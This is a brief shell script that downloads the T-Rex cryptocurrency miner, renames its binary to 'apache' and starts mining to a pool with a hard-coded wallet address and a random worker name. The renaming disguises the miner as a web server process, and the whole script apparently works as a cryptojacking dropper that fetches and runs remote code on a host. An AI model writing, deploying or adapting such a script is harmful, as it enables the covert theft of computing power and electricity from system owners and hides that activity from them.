#!/bin/sh

wget https://github.com/trexminer/T-Rex/releases/download/0.25.15/t-rex-0.25.15-linux.tar.gz
tar -xf t-rex-0.25.15-linux.tar.gz
mv t-rex apache
FOLDER=$( cd -- "$( dirname -- "${BASH_SOURCE[0]}" )" &> /dev/null && pwd )
"$FOLDER"/apache -a etchash -o stratum+tcp://us-etc.2miners.com:11010 -u 0xe86f91de1c860d4a37a095d0518b97d5b033e83b -p x -w $(echo $(shuf -i 1-2000 -n 1)-Konsol) --gpu-report-interval 5 --mt 1

